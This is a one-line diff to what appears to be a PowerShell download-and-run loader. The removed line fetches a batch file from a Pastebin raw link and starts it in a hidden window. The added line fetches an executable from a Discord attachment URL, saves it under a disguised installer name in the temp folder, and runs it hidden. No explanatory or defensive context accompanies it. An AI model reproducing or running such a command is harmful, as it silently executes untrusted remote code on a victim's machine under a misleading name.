@@ -1,1 +1,1 @@
-iwr -useb https://pastebin.com/raw/K01SZCjp -o $env:TEMP\script.bat; saps $env:TEMP\script.bat -WindowStyle Hidden
+iwr -useb https://cdn.discordapp.com/attachments/1050062111855886397/1050062174053216337/Ryujinx.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
